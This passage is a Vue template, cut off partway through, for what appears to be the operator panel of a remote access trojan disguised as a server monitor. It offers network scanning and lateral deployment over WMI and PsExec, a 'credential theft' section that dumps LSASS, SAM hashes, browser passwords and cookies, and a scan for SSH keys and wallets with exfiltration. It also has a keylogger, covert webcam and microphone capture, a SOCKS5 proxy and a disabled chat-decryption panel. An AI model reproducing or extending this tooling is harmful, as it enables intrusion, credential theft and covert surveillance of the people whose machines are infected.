<template>
  <div class="server-detail" v-loading="loading">
    <div class="detail-header">
      <el-button text @click="router.push('/')">
        <el-icon><Back /></el-icon>
        返回总览
      </el-button>
      <h2 class="detail-title" v-if="detail">
        <span class="status-dot" :class="detail.isOnline ? 'online' : 'offline'"></span>
        {{ detail.name }}
      </h2>
      <span class="uptime font-num" v-if="detail?.uptime">运行 {{ detail.uptime }}</span>
    </div>

    <template v-if="detail">
      <div class="info-grid">
        <div class="info-item">
          <span class="info-label">主机</span>
          <span class="info-value">{{ detail.host }}:{{ detail.port }}</span>
        </div>
        <div class="info-item">
          <span class="info-label">系统</span>
          <span class="info-value">{{ detail.osType }}</span>
        </div>
        <div class="info-item">
          <span class="info-label">分组</span>
          <span class="info-value">{{ detail.group || '未分组' }}</span>
        </div>
        <div class="info-item">
          <span class="info-label">负载</span>
          <span class="info-value font-num" v-if="detail.latestMetrics">
            {{ detail.latestMetrics.load1m }} / {{ detail.latestMetrics.load5m }} / {{ detail.latestMetrics.load15m }}
          </span>
        </div>
        <div class="info-item">
          <span class="info-label">进程数</span>
          <span class="info-value font-num">{{ detail.latestMetrics?.processCount ?? '-' }}</span>
        </div>
        <div class="info-item">
          <span class="info-label">网络 I/O</span>
          <span class="info-value font-num" v-if="detail.latestMetrics">
            ↑{{ formatBytes(detail.latestMetrics.netOut) }}/s ↓{{ formatBytes(detail.latestMetrics.netIn) }}/s
          </span>
        </div>
      </div>

      <div class="metric-cards">
        <div class="metric-card">
          <div class="metric-card-title">CPU</div>
          <div ref="cpuGaugeRef" class="metric-chart"></div>
        </div>
        <div class="metric-card">
          <div class="metric-card-title">内存</div>
          <div class="metric-big-num">
            <span class="font-num">{{ (detail.latestMetrics?.memUsage ?? 0).toFixed(1) }}%</span>
            <span class="metric-sub">{{ formatMB(detail.latestMetrics?.memUsed ?? 0) }} / {{ formatMB(detail.latestMetrics?.memTotal ?? 0) }}</span>
          </div>
        </div>
        <div class="metric-card">
          <div class="metric-card-title">磁盘</div>
          <div class="metric-big-num">
            <span class="font-num">{{ (detail.latestMetrics?.diskUsage ?? 0).toFixed(1) }}%</span>
            <span class="metric-sub">{{ formatGB(detail.latestMetrics?.diskUsed ?? 0) }} / {{ formatGB(detail.latestMetrics?.diskTotal ?? 0) }}</span>
          </div>
        </div>
      </div>

      <div class="history-section">
        <div class="history-header">
          <span class="section-title">历史趋势</span>
          <el-radio-group v-model="period" size="small" @change="fetchHistory">
            <el-radio-button value="1h">1小时</el-radio-button>
            <el-radio-button value="6h">6小时</el-radio-button>
            <el-radio-button value="24h">24小时</el-radio-button>
          </el-radio-group>
        </div>
        <div ref="historyChartRef" class="history-chart"></div>
      </div>

      <!-- 交互式终端 -->
      <div class="terminal-section">
        <div class="terminal-header">
          <span class="section-title">远程终端</span>
          <span class="term-status" :class="termStatus">{{ termStatusText }}</span>
          <div class="term-actions">
            <button class="term-btn" @click="connectTerminal" :disabled="termStatus === 'connecting'" v-if="termStatus !== 'connected'">连接</button>
            <button class="term-btn danger" @click="disconnectTerminal" v-if="termStatus === 'connected'">断开</button>
          </div>
        </div>
        <div class="quick-cmds" v-if="detail?.osType?.toLowerCase().includes('windows') && detail?.connectMethod !== 'ssh'">
          <button class="qcmd-btn" @click="sendQuickCmd('show_desktop')" :disabled="quickCmdLoading">回到桌面</button>
          <button class="qcmd-btn" @click="sendQuickCmd('lock_screen')" :disabled="quickCmdLoading">锁定屏幕</button>
          <button class="qcmd-btn" @click="sendQuickCmd('task_manager')" :disabled="quickCmdLoading">任务管理器</button>
          <button class="qcmd-btn" @click="sendQuickCmd('file_explorer')" :disabled="quickCmdLoading">文件管理器</button>
          <button class="qcmd-btn deploy-quick" @click="doForceUpdateCS" :disabled="forceUpdateLoading">
            {{ forceUpdateLoading ? '推送中...' : '推送DLL更新' }}
          </button>
          <span class="qcmd-msg" v-if="quickCmdMsg">{{ quickCmdMsg }}</span>
        </div>
        <div ref="xtermRef" class="xterm-container"></div>
      </div>

      <!-- 桌面查看器（仅 Windows） -->
      <div class="screen-section" v-if="detail?.osType?.toLowerCase().includes('windows')">
        <div class="screen-header">
          <span class="section-title">{{ screenControlMode ? '远程控制' : '桌面查看' }}</span>
          <span class="term-status" :class="screenStatus">{{ screenStatusText }}</span>
          <div class="screen-controls" v-if="screenStatus === 'connected'">
            <select v-model="screenFps" @change="updateScreenConfig" class="screen-select">
              <option :value="1">1 FPS</option>
              <option :value="2">2 FPS</option>
              <option :value="5">5 FPS</option>
              <option :value="10">10 FPS</option>
              <option :value="15">15 FPS</option>
              <option :value="20">20 FPS</option>
              <option :value="30">30 FPS</option>
            </select>
            <select v-model="screenQuality" @change="updateScreenConfig" class="screen-select">
              <option :value="30">低画质</option>
              <option :value="50">中画质</option>
              <option :value="70">高画质</option>
              <option :value="85">极高画质</option>
              <option :value="95">无损</option>
            </select>
            <select v-model="screenScale" @change="updateScreenConfig" class="screen-select">
              <option :value="30">30%</option>
              <option :value="50">50%</option>
              <option :value="75">75%</option>
              <option :value="100">100%</option>
            </select>
          </div>
          <div class="term-actions">
            <button class="term-btn" @click="connectScreen" v-if="screenStatus !== 'connected'">查看</button>
            <button class="term-btn" :class="{ danger: screenControlMode }" @click="screenControlMode = !screenControlMode" v-if="screenStatus === 'connected'">{{ screenControlMode ? '🖱 控制中' : '🖱 控制' }}</button>
            <button class="term-btn danger" @click="disconnectScreen" v-if="screenStatus === 'connected'">停止</button>
          </div>
        </div>
        <div class="screen-viewer" v-if="screenStatus === 'connected' || screenFrame"
          :class="{ 'screen-control-active': screenControlMode }"
          @contextmenu.prevent="onScreenContext"
          tabindex="0" @keydown="onScreenKey($event, 'down')" @keyup="onScreenKey($event, 'up')">
          <canvas ref="screenCanvasRef" class="screen-img"
            v-show="screenFrame"
            :class="{ 'screen-img-control': screenControlMode }"
            @mousedown="onScreenMouse($event, 'down')" @mouseup="onScreenMouse($event, 'up')"
            @mousemove="onScreenMouse($event, 'move')" @wheel.prevent="onScreenWheel"
            @dragstart.prevent />
          <div v-if="!screenFrame && screenError" class="screen-placeholder" style="color:#ef4444">{{ screenError }}</div>
          <div v-if="!screenFrame && !screenError" class="screen-placeholder">等待截图...</div>
        </div>
      </div>

      <!-- 内网扫描 & 横向部署（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">内网扫描 & 横向部署</span>
          <div class="term-actions">
            <button class="term-btn" @click="startNetScan" :disabled="scanLoading">
              {{ scanLoading ? '扫描中...' : '扫描内网' }}
            </button>
          </div>
        </div>
        <div class="lateral-info" v-if="scanResult">
          <span class="lateral-meta">子网: {{ scanResult.subnet }}.0/24 | 本机: {{ scanResult.localIp }}</span>
          <span class="lateral-meta" v-if="scanResult.error" style="color:#ef4444">{{ scanResult.error }}</span>
        </div>
        <div class="lateral-table" v-if="scanResult && scanResult.hosts && scanResult.hosts.length">
          <table>
            <thead>
              <tr>
                <th>IP</th>
                <th>主机名</th>
                <th>开放端口</th>
                <th>操作</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="host in scanResult.hosts" :key="host.ip">
                <td class="font-num">{{ host.ip }}</td>
                <td>{{ host.hostname || '-' }}</td>
                <td class="font-num">{{ host.ports?.join(', ') }}</td>
                <td class="deploy-cell">
                  <button class="qcmd-btn deploy-quick" @click="quickDeploy(host)" :disabled="deployLoading">一键部署</button>
                  <button class="qcmd-btn" @click="openDeployDialog(host)" :disabled="deployLoading">手动</button>
                  <span class="deploy-host-status" v-if="hostDeployStatus[host.ip]" :style="{ color: hostDeployStatus[host.ip].ok ? '#10b981' : '#ef4444' }">
                    {{ hostDeployStatus[host.ip].msg }}
                  </span>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="lateral-empty" v-else-if="scanResult && !scanLoading">
          未发现存活主机
        </div>

      </div>

      <!-- 部署对话框 - Teleport 到 body 防止被父元素裁剪 -->
      <Teleport to="body">
        <div class="deploy-dialog" v-if="deployTarget">
          <div class="deploy-dialog-mask" @click="deployTarget = null"></div>
          <div class="deploy-dialog-body">
            <h3>横向部署到 {{ deployTarget.ip }}</h3>
            <div class="deploy-form">
              <label>用户名</label>
              <input v-model="deployForm.username" placeholder="Administrator" />
              <label>密码</label>
              <input v-model="deployForm.password" type="password" placeholder="密码" />
              <label>方式</label>
              <select v-model="deployForm.method">
                <option value="wmi">WMI (推荐)</option>
                <option value="winrm">WinRM</option>
                <option value="psexec">PsExec/SMB</option>
                <option value="dcom">DCOM</option>
              </select>
            </div>
            <div class="deploy-result" v-if="deployResultMsg">
              <span :style="{ color: deployResultOk ? '#10b981' : '#ef4444' }">{{ deployResultMsg }}</span>
            </div>
            <div class="deploy-actions">
              <button class="term-btn" @click="doLateralDeploy" :disabled="deployLoading">
                {{ deployLoading ? '部署中...' : '执行部署' }}
              </button>
              <button class="term-btn danger" @click="deployTarget = null">取消</button>
            </div>
          </div>
        </div>
      </Teleport>

      <!-- 凭证窃取（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">凭证窃取</span>
          <div class="term-actions">
            <select v-model="credMethod" class="cred-method-select">
              <option value="all">全部</option>
              <option value="credman">Credential Manager</option>
              <option value="wifi">WiFi 密码</option>
              <option value="browser">浏览器密码</option>
              <option value="sam">SAM Hash</option>
              <option value="lsass">LSASS Dump</option>
            </select>
            <button class="term-btn" @click="startCredDump" :disabled="credLoading">
              {{ credLoading ? '提取中...' : '提取凭证' }}
            </button>
          </div>
        </div>
        <div class="cred-results" v-if="credResult">
          <!-- 密码凭据 -->
          <div class="lateral-table" v-if="credPasswords.length">
            <table>
              <thead>
                <tr>
                  <th>来源</th>
                  <th>目标</th>
                  <th>用户名</th>
                  <th>密码/凭据</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(cred, idx) in credPasswords" :key="'p'+idx">
                  <td><span class="cred-source-tag" :class="'src-' + cred.source">{{ cred.source }}</span></td>
                  <td class="cred-target">{{ cred.target || '-' }}</td>
                  <td>{{ cred.username || '-' }}</td>
                  <td class="cred-password">
                    <template v-if="cred.password && cred.password.startsWith('[base64]')">
                      <span class="cred-binary-tag">二进制</span>
                      <button class="qcmd-btn" @click="copyText(cred.password.substring(8), $event)">复制Base64</button>
                    </template>
                    <template v-else-if="cred.password">
                      <span class="password-real">{{ cred.password }}</span>
                      <button class="qcmd-btn" style="margin-left:4px;font-size:10px" @click="copyText(cred.password, $event)">复制</button>
                    </template>
                    <span v-else>-</span>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <!-- Cookie 区域 -->
          <div class="cookie-section" v-if="credCookies.length">
            <div class="cookie-header">
              <span class="cookie-title">🍪 Cookies <span class="cookie-count">{{ credCookies.length }}</span></span>
              <input v-model="cookieSearch" class="cookie-search" placeholder="搜索域名/名称/值..." />
              <button class="qcmd-btn" @click="exportCookies">导出 TXT</button>
              <button class="qcmd-btn" @click="exportCookiesJSON">导出 JSON</button>
            </div>
            <div class="cookie-table-wrap">
              <table class="cookie-table">
                <thead>
                  <tr><th>浏览器</th><th>域名</th><th>名称</th><th>值</th></tr>
                </thead>
                <tbody>
                  <tr v-for="(ck, i) in filteredCookies" :key="'c'+i">
                    <td><span class="cred-source-tag" :class="'src-' + ck.source">{{ ck.source.replace('-cookie','') }}</span></td>
                    <td class="cookie-host">{{ ck.target }}</td>
                    <td class="cookie-name">{{ ck.username }}</td>
                    <td class="cookie-val">
                      <span class="cookie-val-text">{{ ck.password.length > 60 ? ck.password.substring(0,60)+'…' : ck.password }}</span>
                      <button class="qcmd-btn" style="font-size:10px" @click="copyText(ck.password, $event)">复制</button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
          <div class="lateral-empty" v-else-if="!credPasswords.length && !credCookies.length && !credResult.sam">
            {{ credResult.error ? '提取失败: ' + credResult.error : '未提取到凭证' }}
          </div>
          <div class="cred-sam-info" v-if="credResult.sam">
            <strong>SAM/SYSTEM Hive:</strong>
            <span class="cred-sam-status">{{ credResult.sam.substring(0, 80) }}{{ credResult.sam.length > 80 ? '...' : '' }}</span>
            <button class="qcmd-btn" @click="downloadCredData(credResult.sam, 'sam_dump.txt')">下载</button>
          </div>
          <div class="cred-sam-info" v-if="credResult.lsass">
            <strong>LSASS Dump:</strong>
            <span class="cred-sam-status">{{ credResult.lsass.substring(0, 80) }}{{ credResult.lsass.length > 80 ? '...' : '' }}</span>
            <button class="qcmd-btn" @click="downloadCredData(credResult.lsass, 'lsass_dump.txt')">下载</button>
          </div>
        </div>
      </div>

      <!-- 社交软件聊天记录（已移除） -->
      <div class="lateral-section" v-if="false">
        <div class="lateral-header">
          <span class="section-title">社交软件</span>
          <div class="term-actions">
            <button class="term-btn" @click="startChatDump" :disabled="chatLoading">
              {{ chatLoading ? '提取中...' : '提取聊天记录' }}
            </button>
          </div>
        </div>
        <div class="chat-results" v-if="chatResult">
          <!-- 错误信息 -->
          <div class="chat-error-list" v-if="chatErrors.length">
            <span class="chat-error-tag" v-for="(e, i) in chatErrors" :key="'ce'+i">{{ e.source }}: {{ e.password }}</span>
          </div>
          <div v-if="chatResult.error" class="chat-error-list"><span class="chat-error-tag">{{ chatResult.error }}</span></div>
          <!-- 账户摘要 (紧凑) -->
          <div class="chat-status-bar" v-if="chatAccountInfo.length || chatDecryptInfo.length">
            <div class="chat-account-tag" v-for="(acc, i) in chatAccountInfo" :key="'acc'+i">
              <span class="chat-platform-badge" :class="acc.source === 'wechat' ? 'plat-wechat' : 'plat-qq'">{{ acc.source === 'wechat' ? '微信' : 'QQ' }}</span>
              <span class="chat-acc-name">{{ acc.username }}</span>
              <span class="chat-acc-detail" :title="acc.target">{{ acc.password?.startsWith('key_found') ? '密钥已提取' : acc.password?.startsWith('key_not_found') ? '未找到密钥(需登录)' : acc.password?.startsWith('key_error') ? '密钥提取失败' : '' }}</span>
            </div>
            <!-- 解密状态摘要 -->
            <span class="chat-decrypt-summary" v-if="chatDecryptInfo.length">
              解密: {{ chatDecryptInfo.filter((d: any) => d.password?.includes('_ok')).length }}/{{ chatDecryptInfo.length }} 成功
            </span>
            <button class="chat-detail-toggle" @click="chatShowDetails = !chatShowDetails">{{ chatShowDetails ? '收起详情' : '查看详情' }}</button>
          </div>
          <!-- 可折叠的详情区 -->
          <div class="chat-details-panel" v-if="chatShowDetails">
            <div class="chat-detail-row" v-for="(d, i) in chatDecryptInfo" :key="'dd'+i">
              <span class="chat-detail-name">{{ d.target }}</span>
              <span class="chat-detail-status" :class="d.password?.includes('_ok') ? 'ok' : 'fail'">{{ d.password }}</span>
            </div>
            <div class="chat-detail-row" v-if="chatDbInfo.length">
              <span class="chat-detail-name" style="opacity:.5">发现 {{ chatDbInfo.length }} 个数据库文件</span>
            </div>
          </div>
          <!-- 对话列表 + 消息 -->
          <div class="chat-container" v-if="chatConversations.length">
            <div class="chat-conv-list">
              <div class="chat-conv-item" v-for="conv in chatConversations" :key="conv.key"
                :class="{ active: (chatSelectedConv || chatConversations[0]?.key) === conv.key }"
                @click="chatSelectedConv = conv.key">
                <span class="chat-platform-badge" :class="conv.platform === '微信' ? 'plat-wechat' : 'plat-qq'">{{ conv.platform }}</span>
                <div class="chat-conv-info">
                  <div class="chat-conv-name">{{ conv.talker }}</div>
                  <div class="chat-conv-preview">{{ conv.messages[conv.messages.length - 1]?.content?.substring(0, 30) || '' }}</div>
                </div>
                <div class="chat-conv-meta">
                  <span class="chat-conv-time">{{ formatChatTime(conv.lastTs) }}</span>
                  <span class="chat-conv-count">{{ conv.count }}</span>
                </div>
              </div>
            </div>
            <div class="chat-messages">
              <div class="chat-msg-header" v-if="selectedConvInfo">
                <span class="chat-platform-badge" :class="selectedConvInfo.platform === '微信' ? 'plat-wechat' : 'plat-qq'">{{ selectedConvInfo.platform }}</span>
                <span class="chat-msg-title">{{ selectedConvInfo.talker }}</span>
                <span class="chat-msg-count">{{ selectedConvInfo.count }} 条</span>
              </div>
              <div class="chat-msg-body">
                <div v-for="(msg, i) in selectedMessages" :key="i" class="chat-bubble-row" :class="msg.dir">
                  <div class="chat-bubble" :class="msg.dir">
                    <span class="chat-msg-type" v-if="msg.msgType !== '文本'">{{ msg.msgType }}</span>
                    <span class="chat-msg-text">{{ msg.content }}</span>
                  </div>
                  <span class="chat-msg-time">{{ formatChatTime(msg.ts) }}</span>
                </div>
                <div class="chat-msg-empty" v-if="!selectedMessages.length">选择左侧对话查看消息</div>
              </div>
            </div>
          </div>
          <div class="lateral-empty" v-else-if="chatAccountInfo.length && !chatConversations.length">
            已找到账户但未解密出聊天记录，点击「查看详情」可查看解密状态
          </div>
          <div class="lateral-empty" v-else-if="!chatAccountInfo.length && !chatErrors.length">
            未检测到微信或QQ数据
          </div>
        </div>
      </div>

      <!-- 文件管理器（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">文件管理</span>
          <div class="term-actions" style="gap:6px;display:flex">
            <button class="term-btn" style="font-size:11px" @click="showSensitiveScan = !showSensitiveScan">
              {{ showSensitiveScan ? '返回浏览' : '🔍 敏感扫描' }}
            </button>
          </div>
        </div>

        <!-- ── 模式A：文件浏览 + 上传 ── -->
        <template v-if="!showSensitiveScan">
          <div class="file-path-bar" style="padding:6px 12px;display:flex;gap:6px;align-items:center">
            <input class="file-path-input" v-model="fileBrowsePath" placeholder="路径（空=用户目录）"
              @keyup.enter="() => doFileBrowse()" style="flex:1" />
            <button class="term-btn" @click="() => doFileBrowse()" :disabled="fileBrowseLoading">
              {{ fileBrowseLoading ? '加载...' : '浏览' }}
            </button>
          </div>
          <div class="file-current-path" v-if="fileBrowseResult">
            <span class="font-num">{{ fileBrowseResult.path }}</span>
            <button class="qcmd-btn" @click="fileGoUp" v-if="fileBrowseResult.path">上级目录</button>
          </div>
          <div class="file-error" v-if="fileBrowseResult?.error">{{ fileBrowseResult.error }}</div>
          <div class="lateral-table file-table" v-if="fileBrowseResult?.items?.length">
            <table>
              <thead>
                <tr>
                  <th>名称</th>
                  <th>类型</th>
                  <th>大小</th>
                  <th>修改时间</th>
                  <th>操作</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="item in fileBrowseResult.items" :key="item.name" class="file-row"
                  @dblclick="item.type === 'dir' ? fileNavigate(item.name) : null">
                  <td>
                    <span class="file-icon">{{ item.type === 'dir' ? '📁' : '📄' }}</span>
                    <span :class="{ 'file-dir-name': item.type === 'dir' }">{{ item.name }}</span>
                  </td>
                  <td class="file-type">{{ item.type === 'dir' ? '文件夹' : '文件' }}</td>
                  <td class="font-num file-size">{{ item.type === 'file' ? formatFileSize(item.size) : '-' }}</td>
                  <td class="font-num file-time">{{ item.modified || '-' }}</td>
                  <td class="file-actions">
                    <button v-if="item.type === 'dir'" class="qcmd-btn" @click="fileNavigate(item.name)">打开</button>
                    <button v-if="item.type === 'file' && item.size <= 524288000" class="qcmd-btn"
                      @click="doFileDownload(item.name)" :disabled="fileDownloadLoading">
                      {{ fileDownloadName === item.name && fileDownloadLoading ? '下载中...' : '下载' }}
                    </button>
                    <span v-if="item.type === 'file' && item.size > 524288000" class="file-too-large">超过500MB</span>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="lateral-empty" v-else-if="fileBrowseResult && !fileBrowseLoading && !fileBrowseResult.error">
            目录为空
          </div>
          <!-- 上传栏：路径自动从当前浏览目录获取 -->
          <div style="border-top:1px solid rgba(255,255,255,0.08);padding:8px 12px;display:flex;gap:6px;align-items:center;flex-wrap:wrap">
            <span style="font-size:12px;color:#64748b;white-space:nowrap">📤 上传到当前目录</span>
            <input ref="uploadFileRef" type="file" style="font-size:12px;color:#cbd5e1;flex:1;min-width:160px" />
            <button class="term-btn" @click="doFileUpload" :disabled="uploadLoading" style="white-space:nowrap">
              {{ uploadLoading ? '上传中...' : '上传' }}
            </button>
          </div>
          <div v-if="uploadResult" style="padding:2px 12px 6px;font-size:12px;color:#94a3b8">{{ uploadResult }}</div>
        </template>

        <!-- ── 模式B：敏感文件扫描 ── -->
        <template v-else>
          <div style="padding:8px 12px;display:flex;gap:6px;align-items:center">
            <button class="term-btn" @click="doFileSteal" :disabled="fileStealLoading">
              {{ fileStealLoading ? '扫描中...' : '开始扫描' }}
            </button>
            <span style="font-size:12px;color:#64748b">搜索 SSH密钥 / 凭据 / 配置 / 证书 / 钱包等敏感文件</span>
          </div>
          <div class="proc-table-wrap" v-if="fileStealResult?.files?.length">
            <table class="lateral-table">
              <thead><tr>
                <th style="width:14%">类型</th><th>路径</th><th style="width:90px">大小</th><th style="width:65px">操作</th>
              </tr></thead>
              <tbody>
                <tr v-for="(f, idx) in fileStealResult.files" :key="idx">
                  <td><span class="cred-source-tag" :class="'src-' + f.category">{{ f.category }}</span></td>
                  <td class="font-num" style="word-break:break-all">{{ f.path }}</td>
                  <td class="font-num">{{ formatFileSize(f.size || 0) }}</td>
                  <td><button class="qcmd-btn" @click="doFileExfil(f.path)" :disabled="fileExfilLoading">提取</button></td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="lateral-empty" v-else-if="fileStealResult && !fileStealLoading">未发现敏感文件</div>
        </template>
      </div>

      <!-- 摄像头监控（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">摄像头监控</span>
          <div class="term-actions">
            <span class="keylog-status" :class="webcamStreaming ? 'active' : ''">
              {{ webcamStreaming ? '直播中' : '未启动' }}
            </span>
            <button class="term-btn" v-if="!webcamStreaming" @click="doWebcamStreamStart" :disabled="webcamLoading">
              {{ webcamLoading ? '启动中...' : '开始直播' }}
            </button>
            <button class="term-btn danger" v-if="webcamStreaming" @click="doWebcamStreamStop">停止</button>
            <button class="term-btn" @click="doWebcamSnap" :disabled="webcamLoading || webcamStreaming">拍照</button>
            <button class="qcmd-btn" v-if="webcamHasFrame" @click="saveWebcamImage">保存</button>
            <button class="qcmd-btn" v-if="webcamHasFrame" @click="toggleWebcamFullscreen">{{ webcamFullscreen ? '退出全屏' : '全屏' }}</button>
          </div>
        </div>
        <div class="webcam-error" v-if="webcamError">{{ webcamError }}</div>
        <div class="webcam-viewer" ref="webcamViewerRef" v-show="webcamHasFrame" @dblclick="toggleWebcamFullscreen">
          <canvas ref="webcamCanvasRef" class="webcam-img" :class="{ 'webcam-img-fullscreen': webcamFullscreen }"></canvas>
          <div class="webcam-meta">
            <span class="font-num">{{ webcamMeta }}</span>
          </div>
        </div>
        <div class="lateral-empty" v-if="!webcamHasFrame && !webcamLoading && !webcamError">
          点击「开始直播」实时查看摄像头 或「拍照」捕获单帧
        </div>
      </div>

      <!-- 麦克风监听（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">麦克风监听</span>
          <div class="term-actions">
            <span class="keylog-status" :class="micStreaming ? 'active' : ''">
              {{ micStreaming ? '监听中' : '未启动' }}
            </span>
            <button class="term-btn" v-if="!micStreaming" @click="doMicStart" :disabled="micLoading">
              {{ micLoading ? '启动中...' : '开始监听' }}
            </button>
            <button class="term-btn danger" v-if="micStreaming" @click="doMicStop">停止</button>
          </div>
        </div>
        <div class="mic-viewer" v-if="micStreaming || micAudioUrl">
          <div class="mic-visualizer">
            <canvas ref="micCanvasRef" width="600" height="80" class="mic-canvas"></canvas>
          </div>
          <div class="mic-meta">
            <span class="font-num">{{ micMeta }}</span>
          </div>
          <audio ref="micAudioRef" autoplay class="mic-audio-hidden"></audio>
        </div>
        <div class="mic-error" v-if="micError" style="color:#e53e3e;padding:8px 16px;font-size:12px;">{{ micError }}</div>
        <div class="lateral-empty" v-else-if="!micStreaming && !micAudioUrl && !micLoading">
          点击「开始监听」实时收听麦克风音频
        </div>
      </div>

      <!-- 窗口管理（仅 Windows Agent） -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent' && detail?.osType?.toLowerCase().includes('windows')">
        <div class="lateral-header">
          <span class="section-title">窗口管理</span>
          <div class="term-actions">
            <input class="proc-filter-input" v-model="winFilter" placeholder="搜索窗口..." />
            <button class="term-btn" @click="doWindowList" :disabled="winLoading">
              {{ winLoading ? '加载中...' : '刷新' }}
            </button>
          </div>
        </div>
        <div class="proc-table-wrap" v-if="winList.length">
          <table class="lateral-table">
            <thead><tr>
              <th style="width:35%">窗口标题</th>
              <th style="width:15%">进程</th>
              <th style="width:60px">PID</th>
              <th style="width:70px">状态</th>
              <th style="width:180px">操作</th>
            </tr></thead>
            <tbody>
              <tr v-for="w in filteredWins" :key="w.hwnd">
                <td class="proc-title">{{ w.title }}</td>
                <td class="proc-name">{{ w.process }}</td>
                <td>{{ w.pid }}</td>
                <td><span :class="['svc-state', w.state === 'normal' ? 'running' : 'stopped']">{{ w.state === 'minimized' ? '最小化' : w.state === 'maximized' ? '最大化' : '正常' }}</span></td>
                <td class="svc-actions">
                  <button class="qcmd-btn" @click="doWindowControl(w.hwnd, 'show')" title="前置">显示</button>
                  <button class="qcmd-btn" @click="doWindowControl(w.hwnd, 'hide')" title="隐藏">隐藏</button>
                  <button class="qcmd-btn" @click="doWindowControl(w.hwnd, 'minimize')">最小化</button>
                  <button class="qcmd-btn danger" @click="doWindowControl(w.hwnd, 'close')">关闭</button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="lateral-empty" v-else-if="!winLoading">
          点击「刷新」获取窗口列表
        </div>
      </div>

      <!-- 进程管理 -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent'">
        <div class="lateral-header">
          <span class="section-title">进程管理</span>
          <div class="term-actions">
            <input class="proc-filter-input" v-model="procFilter" placeholder="搜索进程..." />
            <button class="term-btn" @click="doProcessList" :disabled="procLoading">
              {{ procLoading ? '加载中...' : '刷新' }}
            </button>
          </div>
        </div>
        <div class="proc-table-wrap" v-if="procList.length">
          <table class="lateral-table">
            <thead><tr>
              <th style="width:70px">PID</th>
              <th style="width:30%">进程名</th>
              <th style="width:100px">内存(KB)</th>
              <th>窗口标题</th>
              <th style="width:60px">操作</th>
            </tr></thead>
            <tbody>
              <tr v-for="p in filteredProcs" :key="p.pid">
                <td>{{ p.pid }}</td>
                <td class="proc-name">{{ p.name }}</td>
                <td>{{ p.mem.toLocaleString() }}</td>
                <td class="proc-title">{{ p.title || '-' }}</td>
                <td><button class="qcmd-btn danger" @click="doProcessKill(p.pid, p.name)" :disabled="procKilling">终止</button></td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="lateral-empty" v-else-if="!procLoading">
          点击「刷新」获取进程列表
        </div>
      </div>

      <!-- 服务管理 -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent'">
        <div class="lateral-header">
          <span class="section-title">服务管理</span>
          <div class="term-actions">
            <input class="proc-filter-input" v-model="svcFilter" placeholder="搜索服务..." />
            <button class="term-btn" @click="doServiceList" :disabled="svcLoading">
              {{ svcLoading ? '加载中...' : '刷新' }}
            </button>
          </div>
        </div>
        <div class="proc-table-wrap" v-if="svcList.length">
          <table class="lateral-table">
            <thead><tr>
              <th style="width:20%">服务名</th>
              <th style="width:30%">显示名</th>
              <th style="width:80px">状态</th>
              <th style="width:80px">启动类型</th>
              <th style="width:60px">PID</th>
              <th style="width:80px">操作</th>
            </tr></thead>
            <tbody>
              <tr v-for="s in filteredSvcs" :key="s.name">
                <td class="proc-name">{{ s.name }}</td>
                <td class="proc-title">{{ s.display }}</td>
                <td>
                  <span :class="['svc-state', s.state === 'Running' ? 'running' : 'stopped']">{{ s.state }}</span>
                </td>
                <td>{{ s.start }}</td>
                <td>{{ s.pid || '-' }}</td>
                <td class="svc-actions">
                  <button class="qcmd-btn" v-if="s.state !== 'Running'" @click="doServiceControl(s.name, 'start')">启动</button>
                  <button class="qcmd-btn danger" v-if="s.state === 'Running'" @click="doServiceControl(s.name, 'stop')">停止</button>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="lateral-empty" v-else-if="!svcLoading">
          点击「刷新」获取服务列表
        </div>
      </div>

      <!-- 键盘记录 -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent'">
        <div class="lateral-header">
          <span class="section-title">键盘记录</span>
          <div class="term-actions">
            <span class="keylog-status" :class="keylogRunning ? 'active' : ''">
              {{ keylogRunning ? '记录中 (每3秒同步)' : '未启动' }}
            </span>
            <button class="term-btn" v-if="!keylogRunning" @click="doKeylogStart">开始记录</button>
            <button class="term-btn danger" v-if="keylogRunning" @click="doKeylogStop">停止</button>
            <button class="term-btn" v-if="keylogData" @click="keylogData = ''">清空</button>
          </div>
        </div>
        <div class="keylog-output" v-if="keylogData" ref="keylogOutputRef">
          <pre class="keylog-pre">{{ keylogData }}</pre>
        </div>
        <div class="lateral-empty" v-else>
          {{ keylogRunning ? '等待键盘输入...' : '点击「开始记录」启动实时键盘监控' }}
        </div>
      </div>

      <!-- SOCKS5 代理 -->
      <div class="lateral-section" v-if="detail?.connectMethod === 'agent'">
        <div class="lateral-header">
          <span class="section-title">SOCKS5 代理</span>
          <div class="term-actions">
            <span v-if="socksRunning" class="keylog-status active">运行中 :{{ socksPort }}</span>
            <span v-else class="keylog-status">未启动</span>
            <input v-if="!socksRunning" v-model.number="socksPortInput" class="reg-input" style="width:80px;flex:none" placeholder="端口" />
            <input v-if="!socksRunning" v-model="socksAuthUser" class="reg-input" style="width:70px;flex:none" placeholder="用户(可选)" />
